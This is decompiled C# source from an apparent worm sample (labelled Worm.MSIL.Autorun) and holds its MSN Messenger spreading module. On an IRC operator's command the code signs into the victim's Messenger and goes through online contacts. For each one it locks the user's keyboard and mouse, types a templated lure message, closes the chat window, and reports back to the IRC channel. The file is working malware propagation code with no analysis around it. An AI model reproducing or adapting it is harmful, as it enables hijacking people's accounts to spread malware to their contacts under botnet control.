// Decompiled with JetBrains decompiler
// Type: spreading.msn
// Assembly: explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 56E5CD67-A795-400A-AA93-F7890471D495
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Worm.MSIL.Autorun.ig-2c86700b4d3a736629e63a7f91f6e488e611145530107c5a2b53ad8867079764.exe

using explorer;
using MessengerAPI;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace spreading
{
  internal class msn
  {
    public const int SC_CLOSE = 61536;
    public const int WM_SYSCOMMAND = 274;
    private string message;
    private irc irc;
    private string channel;

    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

    public void spread(string message, irc irc, string channel)
    {
      this.message = message;
      this.irc = irc;
      this.channel = channel;
      if (storage.msn_spreading == null)
      {
        storage.msn_spreading = new Thread(new ThreadStart(this.spreadthread));
        storage.msn_spreading.Start();
      }
      else
        irc.teller.tell(channel, "Spreading-MSN", config.language_spreading_msn_started_allready, false, false, true);
    }

    private void spreadthread()
    {
      try
      {
        MessengerClass messengerClass = new MessengerClass();
        if (messengerClass.MyStatus == 1)
        {
          messengerClass.AutoSignin();
          while (messengerClass.MyStatus == 512)
            ;
        }
        try
        {
          this.irc.teller.tell(this.channel, "Spreading-MSN", config.language_spreading_msn_started_success.Replace("%email%", messengerClass.MySigninName.ToString()), false, true, false);
          int num = messengerClass[(MUAFOLDER) 0];
          foreach (IMessengerContact myContact in (IMessengerContacts) messengerClass.MyContacts)
          {
            Thread.Sleep(config.spreading_msn_interval_offline);
            if (myContact.Status != 1 && !(myContact.FriendlyName == messengerClass.MyFriendlyName))
            {
              msn.BlockInput(true);
              messengerClass.InstantMessage((object) myContact);
              IntPtr foregroundWindow = msn.GetForegroundWindow();
              try
              {
                string keys = this.message.Replace("%sender%", messengerClass.MySigninName).Replace("%victim%", myContact.SigninName);
                if (config.spreading_msn_send_inchars)
                {
                  foreach (char ch in keys.ToCharArray())
                    SendKeys.SendWait(ch.ToString());
                }
                else
                  SendKeys.SendWait(keys);
                SendKeys.SendWait("{ENTER}");
                Thread.Sleep(500);
                msn.PostMessage(foregroundWindow, 274U, (IntPtr) 61536, IntPtr.Zero);
                msn.BlockInput(false);
                this.irc.teller.tell(this.channel, "Spreading-MSN", config.language_spreading_msn_send_msg_success.Replace("%email%", myContact.SigninName.ToString()), false, true, false);
                Thread.Sleep(config.spreading_msn_interval_online);
              }
              catch
              {
                this.irc.teller.tell(this.channel, "Spreading-MSN", config.language_spreading_msn_send_msg_error.Replace("%email%", myContact.SigninName.ToString()), true, false, false);
                msn.PostMessage(foregroundWindow, 274U, (IntPtr) 61536, IntPtr.Zero);
              }
            }
          }
        }
        catch
        {
          this.irc.teller.tell(this.channel, "Spreading-MSN", config.language_spreading_msn_started_error.Replace("%email%", messengerClass.MySigninName.ToString()), true, false, false);
        }
        this.irc.teller.tell(config.channel, "Spreading-MSN", config.language_spreading_msn_stopped_success, false, true, false);
        storage.msn_spreading = (Thread) null;
      }
      catch
      {
        this.irc.teller.tell(this.channel, "Spreading-MSN", config.language_spreading_msn_nomsn, false, false, true);
      }
    }
  }
}
